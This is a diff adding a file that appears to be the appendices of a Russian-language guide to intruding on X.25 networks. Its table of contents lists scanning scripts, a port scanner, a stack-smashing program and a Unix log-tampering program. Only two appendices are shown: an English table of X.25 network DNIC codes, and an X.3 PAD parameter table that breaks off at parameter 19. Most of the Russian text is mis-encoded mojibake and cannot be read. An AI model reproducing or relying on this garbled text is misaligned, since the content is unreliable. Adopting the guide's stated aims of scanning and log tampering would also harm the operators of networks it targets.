@@ -1,0 +1,1779 @@
+
+
+                             ëÆ§•‡¶†≠®•.
+
+
+        è‡®´Æ¶•≠®• 1. DNIC ≠•™Æ‚Æ‡ÎÂ ·•‚•©.
+        è‡®´Æ¶•≠®• 2. è†‡†¨•‚‡Î èÄÑ (X.3).
+        è‡®´Æ¶•≠®• 3. è‡®¨•‡ ·™‡®Ø‚† §´Ô ·™†≠®‡Æ¢†≠®Ô Sprint.
+        è‡®´Æ¶•≠®• 4. è‡Æ£‡†¨¨† ·™†≠®‡Æ¢†≠®Ô TCP ØÆ‡‚Æ¢.
+        è‡®´Æ¶•≠®• 5. ç•™Æ‚Æ‡Î• OS ® ®Â Ø‡®£´†Ë•≠®Ô.
+        è‡®´Æ¶•≠®• 6. è‡®¨•‡ Ø‡Æ£‡†¨¨Î §´Ô ·‡Î¢† ·‚•™†.
+        è‡®´Æ¶•≠®• 7. è‡Æ£‡†¨¨† ¨Æ§®‰®™†Ê®® log-‰†©´Æ¢ Unix.
+        è‡®´Æ¶•≠®• 8. è‡Æ£‡†¨¨† Ø‡Æ·¨Æ‚‡† ®≠‰Æ‡¨†Ê®® Dialup ·Æ•§®≠•≠®© Windows.
+
+
+
+
+
+è‡®´Æ¶•≠®• 1. DNIC ≠•™Æ‚Æ‡ÎÂ ·•‚•©.
+
+--- begin networks.txt ---
+        X.25 Networks sorted at DNIC
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+DNIC        Country                 Network
+
+2022        Greece                  HELPAK
+2041        Netherlands             DATANET
+2062        Belgium                 DCS
+2080        France                  TRANSPAC
+2080        Guadeloupe              TRANSPAC
+2080        Guiana (french)         TRANSPAC
+2080        Martinique              TRANSPAC
+2080        Reunion                 TRANSPAC
+2081                                NTI
+2141        Spain                   TIDA
+2145        Spain                   IBERPAC
+2160        Hungary                 NEDIX
+2161                                DATEX-P
+2201        Croatia                 CROAPAC
+2201        Slovenia                SIPAX.25
+2201        Yugoslavia              YUGOPAC
+2222        Italy                   ITAPAC
+2227        Italy                   ITALCABLE GW
+2284        Switzerland             TELEPAC
+2301        Czech.Rep.              EUROTEL
+2301        Slovak.Rep.             EUROTEL
+2322        Austria                 DATEX-P
+2329        Austria                 RADIOAUSTRIA
+2341        UNITED KINGDOM          BT
+2342        UNITED KINGDOM          PSS
+2350        UNITED KINGDOM          MERCURY
+2351        UNITED KINGDOM          MERCURY
+2382        Denmark                 DATAPAK
+2402        Sweden                  DATAPAK
+2403        Sweden                  DATAPAC
+2422        Norway                  DATAPAK
+2442        Finland                 DATAPAK
+2500        Russia                  ROSPACK
+2501        Russia                  RO-SPRINT
+2502        Russia                  IASNET
+2503        Russia                  MMTL SOVPACK
+2504        Russia                  Infotel
+2506        Russia                  ROSNET
+2507        Russia                  ISTOK-K
+2508        Russia                  TRANSINFORM
+2510        Russia                  SOVAMNET
+2511        Russia                  EDITRANS
+2550        Ukraine                 UKRPAC
+2551        Ukraine                 BKCNET
+2570        Belarusia               BELPACK
+2601        Poland                  POLPAC
+2624        Germany                 DATEX-P
+2680        Portugal                TELEPAC
+2704        Luxembourg              LUXPAC
+2724        Ireland                 EIRPAC
+2740        Iceland                 ICEPAC
+2802        Cyprus                  CYTAPAC
+2821        Georgia                 IBERIAPAC
+2841        Bulgaria                BULPAC
+2862        Turkey                  TURPAC
+2863        Turkey                  TURPAC
+2931        Slovenia                SIPAX 25
+2945        Andorra                 ANDORPAC
+3020        Canada                  DATAPAC
+3025                                TELEGLOBE
+3101        U.S.A. incl. Hawaii     AT&T WORLDNET
+3103        U.S.A. incl. Hawaii     ITT-UDTS
+3104        U.S.A. incl. Hawaii     MCII/WUI
+3106        U.S.A. incl. Hawaii     TYMNET
+3107        --------''---------     AT&T WORLDNET
+3110        --------''---------     SPRINTNET
+3113        --------''---------     RCAG REM.
+3118        --------''---------     GRAPHNET
+3119        --------''---------     TRT
+3124        --------''---------     FTCC
+3126        --------''---------     ADP/AUTON.
+3134        --------''---------     AT&T ACCUNET
+3136        --------''---------     GEISCO DATA
+3137        --------''---------     INFONET
+3140        --------''---------     CONNET
+3150        --------''---------     GLOBNET
+3151        --------''---------     DATAAMERICA
+3152        Hawaii                  GTE
+3300        Dominican Rep.          UDTS
+3300        Puerto Rico,Qatar,Sudan UDTS
+3300        US-Virgin Isl.          UDTS
+3340        Mexico                  TELEPAC
+3503        Bermuda                 BERMUDANET
+3701        Dominican Rep.          CODEPAC
+3740        Trinidad/Tobago         TEXDAT
+3745                                DATANET
+4042        India                   GPSS
+4131        Sri Lanka              DATAPAC
+4201        Saudi Arabia            ALWASEET
+4243        Un.Arab.Emirates        EMDAN
+4251        Israel                  ISRANET
+4263        Bahrein                 BAHNET
+4401        Japan                   DDX-P
+4408                                VENUS-P
+4500        Korea Rep.              HINET-P
+4501        Korea Rep.              DACOM-NET
+4542        Hong Kong               INTPAK
+4545        Hong Kong               DATAPAC
+4546                                INET
+4550        Macao                   MACAOPAC
+4602        China                   CHINAPAC
+4876        Taiwan                  PACNET III
+4877        Taiwan                  UDAS
+5021        Malaysia                MAYPAC
+5052        Australia               AUSTPAC
+5053                                OTC (A)
+5101        Indonesia               INDOSAT
+5151                                CAPWIRE
+5152                                PHILCOM
+5154        Philippines             GMCR
+5156        Philippines             EASTN./ETPI
+5201        TYAILAND                THAIPAC
+5202        TYAILAND                THAIPAC II
+5301        New Zealand             PACNET
+5460        New Caledonia           TOMPAC
+5470        Polynesia(french)       DOMPAC
+6020        Egypt,Kuwait,Oman       ARENTO
+6041        Marocco                 MAGRIPAC
+6050                                TUNISTA
+6081        Senegal                 SENPAC
+6282        Gabon                   GABONPAC
+6550        Sout Africa             SAPONET-P
+7120        Costa Rica              RACSAPAC
+7160        Peru                    PERUNET
+7220        Argentina               UDTS
+7222        Argentina               ARPAC
+7240        Brazil                  INTERDATA
+7241                                RENPAC
+7302        Chile                   RNTD-CHILE
+7303        Chile                   CILEPAC
+7305                                TOMNET
+7320        Colombia                DAPAQ INT.
+7342        Venezuela               CANTV
+---
+
+è‡®´Æ¶•≠®• 2. è†‡†¨•‚‡Î èÄÑ (X.3).
+
+--- begin x3par.txt ---
+                      è†‡†¨•‚‡Î èÄÑ (X.3).
+
+⁄ƒƒƒ¬ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
+≥ N ≥      ÆØ®·†≠®• Ø†‡†¨•‚‡† ® ¢Æß¨Æ¶≠Î• ß≠†Á•≠®Ô Ø†‡†¨•‚‡†         ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 1.≥ ¢ÎßÆ¢ ·‡•§·‚¢ èÄÑ Ø„‚•¨ ¢ÎÂÆ§† ®ß ‡•¶®¨† "Ø•‡•§†Á† §†≠≠ÎÂ"     ≥
+≥   ≥               0 - ¢ÎßÆ¢ ≠•¢Æß¨Æ¶•≠                             ≥
+≥   ≥               1 - ¢ÎßÆ¢ ¢Æß¨Æ¶•≠ ØÆ ¢¢Æ§„ ·®¨¢Æ´† CTRL/P       ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 2.≥ „·‚†≠Æ¢´•≠®• ‡•¶®¨† ¢Î§†Á® èÄÑ ÌÂ† ≠† ·®¨¢Æ´Î, ¢¢Æ§®¨Î• ·      ≥
+≥   ≥ ‚•‡¨®≠†´†                                                      ≥
+≥   ≥               0 - ≠•‚ ÌÂ†                                      ≥
+≥   ≥               1 - ÌÂÆ •·‚Ï                                     ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 3.≥ ¢Î°Æ‡ ‡•¶®¨† ß†¢•‡Ë•≠®Ô ·°Æ‡™® Ø†™•‚† §†≠≠ÎÂ                   ≥
+≥   ≥               0 - „·‚†≠Æ¢®‚Ï ‡•¶®¨ Ø•‡•§†Á® Ø†™•‚† ØÆ •£Æ      ≥
+≥   ≥                   ß†ØÆ´≠•≠®Ó                                   ≥
+≥   ≥               1 - „·‚†≠Æ¢®‚Ï  ‡•¶®¨  Ø•‡•§†Á®  Ø†™•‚†  ØÆ      ≥
+≥   ≥                   ·®¨¢Æ´„ "*"                                  ≥
+≥   ≥               2 - „·‚†≠Æ¢®‚Ï  ‡•¶®¨  Ø•‡•§†Á®  Ø†™•‚†  ØÆ      ≥
+≥   ≥                   ·®¨¢Æ´„ CR                                   ≥
+≥   ≥               4 - „·‚†≠Æ¢®‚Ï  ‡•¶®¨  Ø•‡•§†Á®  Ø†™•‚†  ØÆ      ≥
+≥   ≥                   ·®¨¢Æ´„ ESC, DEL, END, ACK                   ≥
+≥   ≥               6 - „·‚†≠Æ¢®‚Ï  ‡•¶®¨  Ø•‡•§†Á®  Ø†™•‚†  ØÆ      ≥
+≥   ≥                   ·®¨¢Æ´„ CR, ESC, DEL, END, ACK               ≥
+≥   ≥             126 - „·‚†≠Æ¢®‚Ï  ‡•¶®¨  Ø•‡•§†Á®  Ø†™•‚†  ØÆ      ≥
+≥   ≥                   ´Ó°Æ¨„  „Ø‡†¢´ÔÓÈ•¨„   ·®¨¢Æ´„,   ™‡Æ¨•      ≥
+≥   ≥                   ·®¨¢Æ´Æ¢ ‡•§†™‚®‡Æ¢†≠®Ô Ø‡®  ¢™´ÓÁ•≠≠Æ¨      ≥
+≥   ≥                   ‡•¶®¨• ‡•§†™‚®‡Æ¢†≠®Ô                        ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 4.≥ ¢Î°Æ‡ ¢‡•¨•≠® ß†§•‡¶™® ‚†©¨•‡†                                 ≥
+≥   ≥               0 - Æ‚·„‚·‚¢®• ‚†©¨†„‚†                          ≥
+≥   ≥           1-255 - „·‚†≠Æ¢®‚Ï  ØÆ ¢Î°Æ‡„ ´Ó°Æ• ¢‡•¨Ô Æ‚  1      ≥
+≥   ≥                   §Æ   255   §¢†§Ê†‚ÎÂ    §Æ´•©   ·•™„≠§Î      ≥
+≥   ≥                   (Ë†£ 1/20 ·)  ØÆ·´•  ¢¢Æ§†  ·®¨¢Æ´†, ØÆ      ≥
+≥   ≥                   ®·‚•Á•≠®®   ™Æ‚Æ‡Æ£Æ  ØÆ·Î´†•‚·Ô  Ø†™•‚      ≥
+≥   ≥                   §†≠≠ÎÂ                                       ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 5.≥ „Ø‡†¢´•≠®• ·Æ ·‚Æ‡Æ≠Î èÄÑ ØÆ‚Æ™Æ¨ §†≠≠ÎÂ Æ‚ ‚•‡¨®≠†´†          ≥
+≥   ≥               0 - „Ø‡†¢´•≠®• ¢Î™´ÓÁ•≠Æ, „Ø‡†¢´ÔÓÈ®• ·®¨¢Æ´Î    ≥
+≥   ≥                   CTRL/Q ® CTRL/S Ø•‡•§†•‚·Ô ™†™ §†≠≠Î•        ≥
+≥   ≥               1 - „Ø‡†¢´•≠®•  ØÆ‚Æ™Æ¨  §†≠≠ÎÂ  ‚•‡¨®≠†´†  ·    ≥
+≥   ≥                   ØÆ¨ÆÈÏÓ ·®¨¢Æ´Æ¢ CTRL/Q ® CTRL/S ¢ ‡•¶®¨†Â   ≥
+≥   ≥                   Ø•‡•§†Á® §†≠≠ÎÂ ® ™Æ¨†≠§≠Æ¨                  ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 6.≥ „Ø‡†¢´•≠®• ¢Î§†Á•© ≠† ‚•‡¨®≠†´ ØÆ´ÏßÆ¢†‚•´Ô ·ÆÆ°È•≠®© èÄÑ      ≥
+≥   ≥               0 - ·ÆÆ°È•≠®Ô èÄÑ ® "ØÆ§·™†ß™†" ≠• ¢Î¢Æ§Ô‚·Ô ≠†  ≥
+≥   ≥                   ‚•‡¨®≠†´                                     ≥
+≥   ≥               1 - ·ÆÆ°È•≠®Ô èÄÑ ¢Î¢Æ§®‚·Ô ≠† ‚•‡¨®≠†´          ≥
+≥   ≥               4 - "ØÆ§·™†ß™†"  èÄÑ ¢Î¢Æ§Ô‚·Ô ≠† ‚•‡¨®≠†´       ≥
+≥   ≥               5 - ·ÆÆ°È•≠®Ô  ®  "ØÆ§·™†ß™†"  èÄÑ ¢Î¢Æ§Ô‚·Ô ≠†  ≥
+≥   ≥                   ‚•‡¨®≠†´                                     ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 7.≥ ¢Î°Æ‡ ·ØÆ·Æ°† ‡•†™Ê®® èÄÑ ØÆ´„Á•≠®• ·®£≠†´† BREAK Æ‚ ‚•‡¨®≠†´† ≥
+≥   ≥               0 - èÄÑ ≠• ‡•†£®‡„•‚ ≠† ·®£≠†´ BREAK             ≥
+≥   ≥               1 - èÄÑ Ø•‡•§†•‚  ≠†  „§†´•≠≠„Ó  ·‚Æ‡Æ≠„  Ø†™•‚  ≥
+≥   ≥                   "Ø‡•‡Î¢†≠®•"                                 ≥
+≥   ≥               2 - èÄÑ Ø•‡•§†•‚  ≠†  „§†´•≠≠„Ó  ·‚Æ‡Æ≠„  Ø†™•‚  ≥
+≥   ≥                   "·°‡Æ·"                                      ≥
+≥   ≥               4 - èÄÑ Ø•‡•§†•‚ Ø†™•‚ ®≠§®™†Ê®® ·®£≠†´†  BREAK  ≥
+≥   ≥                   ≠† „§†´•≠≠„Ó ·‚Æ‡Æ≠„                         ≥
+≥   ≥               8 - èÄÑ ¢Æ·Ø‡®≠®¨†•‚ ·®£≠†´ BREAK ™†™ Ø•‡•ÂÆ§ ¢  ≥
+≥   ≥                   ™Æ¨†≠§≠Î© ‡•¶®¨                              ≥
+≥   ≥              21 - §†≠≠Î•, Ø‡®≠®¨†•¨Î• ®ß ·•‚®,  ·°‡†·Î¢†Ó‚·Ô,  ≥
+≥   ≥                   †  ≠†  „§†´•≠≠„Ó  ·‚†≠Ê®Ó  Ø•‡•§†•‚·Ô Ø†™•‚  ≥
+≥   ≥                   Ø‡•‡Î¢†≠®Ô ® Ø†™•‚ ®≠§®™†Ê®® ·®£≠†´† BREAK   ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 8.≥ ·°‡Æ· èÄÑ §†≠≠ÎÂ, Ø‡®≠®¨†•¨ÎÂ ®ß ·•‚®                          ≥
+≥   ≥               0 - §†≠≠Î•, Ø‡®≠®¨†•¨Î• ®ß ·•‚®, ¢Î¢Æ§Ô‚·Ô  ≠†   ≥
+≥   ≥                   ‚•‡¨®≠†´                                     ≥
+≥   ≥               1 - §†≠≠Î•, Ø‡®≠®¨†•¨Î• ®ß ·•‚®,  ·°‡†·Î¢†Ó‚·Ô   ≥
+≥   ≥                   °•ß ¢Î¢Æ§† ≠† ‚•‡¨®≠†´                       ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥ 9.≥ ß†ØÆ´≠•≠®• ØÆ·´• ¢Æß¢‡†‚† ™†‡•‚™®                              ≥
+≥   ≥               0 - ≠•‚  ¢·‚†¢™®  ß†ØÆ´≠ÔÓÈ®Â  ·®¨¢Æ´Æ¢  ØÆ·´•   ≥
+≥   ≥                   ¢Æß¢‡†‚† ™†‡•‚™®                             ≥
+≥   ≥           1-255 - Á®·´Æ ·®¨¢Æ´Æ¢ ß†ØÆ´≠•≠®Ô, ¢·‚†¢´Ô•¨ÎÂ  èÄÑ  ≥
+≥   ≥                   ØÆ·´•  ¢Æß¢‡†‚†   ™†‡•‚™®  §´Ô  ß†ØÆ´≠•≠®Ô   ≥
+≥   ≥                   Ø‡Æ¨•¶„‚™†  ¢‡•¨•≠®,  ¢  ‚•Á•≠®•  ™Æ‚Æ‡Æ£Æ   ≥
+≥   ≥                   ¢ÎØÆ´≠Ô•‚·Ô Ø•‡•¢Æ§  ·‚‡Æ™®;  ®·ØÆ´Ïß„•‚·Ô   ≥
+≥   ≥                   §´Ô  Æ°•·Ø•Á•≠®Ô  ≠Æ‡¨†´Ï≠Æ© ‡†°Æ‚Î ‚•‡¨®-   ≥
+≥   ≥                   ≠†´Æ¢ · °„¨†¶≠Æ© ´•≠‚Æ©                      ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥10.≥ ‰Æ‡¨®‡Æ¢†≠®• ·‚‡Æ™® (≠• ‡•†´®ßÆ¢†≠)                            ≥
+≥   ≥               0 - Æ‚·„‚·‚¢®• ‰Æ‡¨®‡Æ¢†≠®Ô ·‚‡Æ™®               ≥
+≥   ≥           1-255 - Á®·´Æ ·®¨¢Æ´Æ¢, ØÆ·´• ™Æ‚Æ‡Æ£Æ ¢·‚†¢´Ô•‚·Ô   ≥
+≥   ≥                   ·®¨¢Æ´   CR,  Á‚Æ  ØÆß¢Æ´Ô•‚  Æ£‡†≠®Á®¢†‚Ï   ≥
+≥   ≥                   ™Æ´®Á•·‚¢Æ ·®¨¢Æ´Æ¢ ¢ ·‚‡Æ™•, ¢Î¢Æ§®¨Æ© ≠†   ≥
+≥   ≥                   ‚•‡¨®≠†´                                     ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥11.≥ ·™Æ‡Æ·‚Ï ØÆ§™´ÓÁ•≠®Ô ‚•‡¨®≠†´†                                 ≥
+≥   ≥               3 - 1200 °®‚/·  „·‚†≠Æ¢´•≠®• ·Æ£´†·≠Æ ‡•ß„´Ï-    ≥
+≥   ≥               4 -  600 °®‚/·  ‚†‚„ †¢‚Æ¨†‚®Á•·™Æ£Æ ÆØ‡•§•´•-   ≥
+≥   ≥              12 - 2400 °®‚/·  ≠®Ô ·™Æ‡Æ·‚® Æ§≠Æ£Æ ®ß  Ø•‡•-    ≥
+≥   ≥              13 - 4800 °®‚/·  Á®·´•≠≠ÎÂ ß≠†Á•≠®©               ≥
+≥   ≥              14 - 9600 °®‚/·                                   ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥12.≥ „Ø‡†¢´•≠®• ØÆ‚Æ™Æ¨ §†≠≠ÎÂ ·Æ ·‚Æ‡Æ≠Î èÄÑ                       ≥
+≥   ≥               0 - „Ø‡†¢´ÔÓÈ®• ·®¨¢Æ´Î CTRL/Q,  CTRL/S  Ø•‡•-   ≥
+≥   ≥                   §†Ó‚·Ô  ™†™  §†≠≠Î•,  èÄÑ  ≠•  Æ·„È•·‚¢´Ô•‚  ≥
+≥   ≥                   „Ø‡†¢´•≠®• ØÆ‚Æ™Æ¨ §†≠≠ÎÂ                    ≥
+≥   ≥               1 - èÄÑ Æ·„È•·‚¢´Ô•‚  „Ø‡†¢´•≠®• ØÆ‚Æ™Æ¨ §†≠≠ÎÂ  ≥
+≥   ≥                   · ØÆ¨ÆÈÏÓ ·®¨¢Æ´Æ¢ CTRL/Q, CTRL/S            ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥13.≥ ¢·‚†¢™† ·®¨¢Æ´† "≠Æ¢†Ô ·‚‡Æ™†"                                 ≥
+≥   ≥               0 - ·®¨¢Æ´ LF ≠• ¢·‚†¢´Ô•‚·Ô                     ≥
+≥   ≥               1 - èÄÑ  ¢·‚†¢´Ô•‚  ·®¨¢Æ´   LF  ØÆ·´•  ™†¶§Æ£Æ  ≥
+≥   ≥                   ·®¨¢Æ´† CR ¢ ØÆ‚Æ™• §†≠≠ÎÂ , ¢Î¢Æ§®¨ÎÂ  ≠†   ≥
+≥   ≥                   ‚•‡¨®≠†´                                     ≥
+≥   ≥               2 - èÄÑ ¢·‚†¢´Ô•‚ ·®¨¢Æ´  LF ØÆ·´• ·®¨¢Æ´† CR ¢  ≥
+≥   ≥                   ØÆ‚Æ™• §†≠≠ÎÂ Æ‚ ‚•‡¨®≠†´†                   ≥
+≥   ≥               4 - èÄÑ  Ø•‡•§†•‚ ·®¨¢Æ´  LF ØÆ·´• ¢Æß¢‡†‚† ÌÂ†  ≥
+≥   ≥                   ≠† ·®¨¢Æ´ CR ≠† ‚•‡¨®≠†´                     ≥
+≥   ≥               5 - èÄÑ ¢·‚†¢´Ô•‚ ·®¨¢Æ´  LF ØÆ·´• ·®¨¢Æ´† CR ¢  ≥
+≥   ≥                   ØÆ‚Æ™• §†≠≠ÎÂ ≠† ‚•‡¨®≠†´                    ≥
+≥   ≥               6 - èÄÑ ¢·‚†¢´Ô•‚ ·®¨¢Æ´  LF ØÆ·´• ·®¨¢Æ´† CR ¢  ≥
+≥   ≥                   ØÆ‚Æ™• §†≠≠ÎÂ Æ‚ ‚•‡¨®≠†´† ® ØÆ·´• ¢Æß¢‡†-   ≥
+≥   ≥                   ‚† ÌÂÆ ≠† CR ≠† ‚•‡¨®≠†´                     ≥
+≥   ≥               7 - èÄÑ ¢·‚†¢´Ô•‚ ·®¨¢Æ´  LF ØÆ·´• ·®¨¢Æ´† CR ¢  ≥
+≥   ≥                   ØÆ‚Æ™• §†≠≠ÎÂ Æ‚ ‚•‡¨®≠†´† ®  ¢Î¢Æ§®¨ÎÂ ≠†   ≥
+≥   ≥                   ‚•‡¨®≠†´ ® ØÆ·´• ¢Æß¢‡†‚†  ÌÂ†  ≠†  CR  ≠†   ≥
+≥   ≥                   ‚•‡¨®≠†´                                     ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥14.≥ ß†ØÆ´≠•≠®• ØÆ·´• ·®¨¢Æ´† "≠Æ¢†Ô ·‚‡Æ™†"                        ≥
+≥   ≥               0 - ≠•‚ ¢·‚†¢™® ß†ØÆ´≠ÔÓÈ®Â ·®¨¢Æ´Æ¢ ØÆ·´• LF    ≥
+≥   ≥            -255 - Á®·´Æ ·®¨¢Æ´Æ¢ ß†ØÆ´≠•≠®Ô , ¢·‚†¢´Ô•¨ÎÂ èÄÑ  ≥
+≥   ≥                   ·®¨¢Æ´Æ¢   LF  §´Ô  ß†ØÆ´≠•≠®Ô  Ø‡Æ¨•¶„‚™†   ≥
+≥   ≥                   ¢‡•¨•≠®, ¢ ‚•Á•≠®• ™Æ‚Æ‡Æ£Æ Æ‚‡†°†‚Î¢†•‚·Ô   ≥
+≥   ≥                   LF; ®·ØÆ´Ïß„•‚·Ô §´Ô Æ°•·Ø•Á•≠®Ô  ≠Æ‡¨†´Ï-   ≥
+≥   ≥                   ≠Æ© ‡†°Æ‚Î ‚•‡¨®≠†´Æ¢ · °„¨†¶≠Æ© ´•≠‚Æ©      ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥15.≥ ‡•§†™‚®‡Æ¢†≠®• ¢ ‡•¶®¨• Ø•‡•§†Á® §†≠≠ÎÂ                        ≥
+≥   ≥               0 - ¢ ‡•¶®¨• Ø•‡•§†Á® §†≠≠ÎÂ  ‰„≠™Ê®®  ‡•§†™‚®-  ≥
+≥   ≥                   ‡Æ¢†≠®Ô ≠•  ®·ØÆ´Ïß„Ó‚·Ô, ·®¨¢Æ´Î  ‡•§†™‚®-  ≥
+≥   ≥                   ‡Æ¢†≠®Ô Ø•‡•§†Ó‚·Ô ™†™ §†≠≠Î•                ≥
+≥   ≥               1 - ‰„≠™Ê®®  ‡•§†™‚®‡Æ¢†≠®Ô  ®·ØÆ´Ïß„Ó‚·Ô   èÄÑ, ≥
+≥   ≥                   ·®¨¢Æ´Î ‡•§†™‚®‡Æ¢†≠®Ô  ÆØ‡•§•´ÔÓ‚·Ô  Ø†‡†-  ≥
+≥   ≥                   ¨•‚‡†¨® 16,17,18, 19                         ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥16.≥ ·®¨¢Æ´ „§†´•≠®Ô ØÆ·´•§≠•£Æ ¢¢•§•≠≠Æ£Æ ·®¨¢Æ´†                  ≥
+≥   ≥           0-127 - ™Æ§  ·®¨¢Æ´†,  ®·ØÆ´Ïß„•¨Î©   §´Ô  „§†´•≠®Ô  ≥
+≥   ≥                   ØÆ·´•§≠•£Æ ¢¢•§•≠≠Æ£Æ ·®¨¢Æ´† (™†™ Ø‡†¢®´Æ,  ≥
+≥   ≥                   8 - BACKSPACE, ®´® ëTRL/H)                   ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥17.≥ ·®¨¢Æ´ „§†´•≠®Ô ØÆ·´•§≠•© ¢¢•§•≠≠Æ© ·‚‡Æ™®                     ≥
+≥   ≥           0-127 - ™Æ§  ·®¨¢Æ´†,  ®·ØÆ´Ïß„•¨Î©   §´Ô  „§†´•≠®Ô  ≥
+≥   ≥                   ·‚‡Æ™® (™† Ø‡†¢®´Æ, 24 CTRL/X)               ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥18.≥ ·®¨¢Æ´ ¢Î§†Á® ≠† ‚•‡¨®≠†´ ØÆ·´•§≠•© ¢¢•§•≠≠Æ© ·‚‡Æ™®           ≥
+≥   ≥           0-127 - ™Æ§ ·®¨¢Æ´†, ®·ØÆ´Ïß„•¨Î© §´Ô ¢Î¢Æ§† ·‚‡Æ™®, ≥
+≥   ≥                   ¢¢•§•≠≠Æ©   ØÆ´ÏßÆ¢†‚•´•¨   (™†™   Ø‡†¢®´Æ,  ≥
+≥   ≥                   18 CTRL/R)                                   ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥19.≥ ‡•§†™‚®‡Æ¢†≠®• ¢ ™Æ¨†≠§≠Æ¨ ‡•¶®¨•                              ≥
